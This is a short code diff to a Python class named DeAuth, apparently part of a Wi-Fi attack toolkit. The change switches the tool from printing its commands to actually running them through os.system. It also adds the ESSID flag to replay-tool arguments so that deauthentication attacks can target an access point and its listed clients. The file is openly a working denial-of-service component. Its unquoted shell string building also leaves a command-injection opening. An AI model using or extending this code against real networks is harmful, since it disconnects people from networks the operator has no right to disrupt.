@@ -9,6 +9,7 @@ import os
 import attack
 ##############################################################################
 
+
 class DeAuth(attack.Attack):
 
     def __init__(self,  interpreter):
@@ -62,20 +63,18 @@ class DeAuth(attack.Attack):
 
     def _execute_attack(self, cmds):
         for cmd in cmds:
-            #os.system(' '.join(cmd))
-            print 'Execute: ', ' '.join(cmd)
-            import time
-            time.sleep(2)
+            os.system(' '.join(cmd))
+            self.logger.debug('Execude: %s', ' '.join(cmd))
 
     def _attack_without_clients(self, ap_mac, essid, iface):
-        cmds = ['-a', ap_mac, essid, iface]
+        cmds = ['-a', ap_mac, '-e' , essid, iface]
         self._execute_attack([self._getReplayArgs() + cmds])
 
     def _attack_with_clients(self, ap_mac, essid, iface, clients):
         cmds = []
         opts = self._getReplayArgs()
         for client in clients:
-            cmds.append(opts + ['-c', client, '-a', ap_mac, essid, iface])
+            cmds.append(opts + ['-c', client, '-a', ap_mac, '-e', essid, iface])
         self._execute_attack(cmds)
 
     def __startDeauthAttack(self, **kw):
